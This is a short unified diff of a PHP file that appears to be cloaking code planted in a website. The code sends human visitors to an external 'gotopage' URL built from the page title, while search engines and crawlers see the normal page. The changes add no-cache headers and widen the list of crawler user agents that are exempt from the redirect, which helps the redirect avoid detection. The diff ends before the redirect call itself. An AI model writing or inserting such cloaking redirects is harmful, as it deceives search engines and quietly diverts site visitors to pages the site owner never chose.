@@ -1,9 +1,14 @@
 <?php
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
+?>
+<?php
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     
     // (case-insensitive)
-    if (!preg_match('/google|bing|yandex/i', $user_agent)) {
+    if (!preg_match('/google|bing|yandex|bot|spider|crawler/i', $user_agent)) {
         $relative_gotopage_url = 'https://www.sookeregionchamber.com/gotopage/?p=' . urlencode(strtoupper($title));
         
         // Redirect pengguna menggunakan path relatif
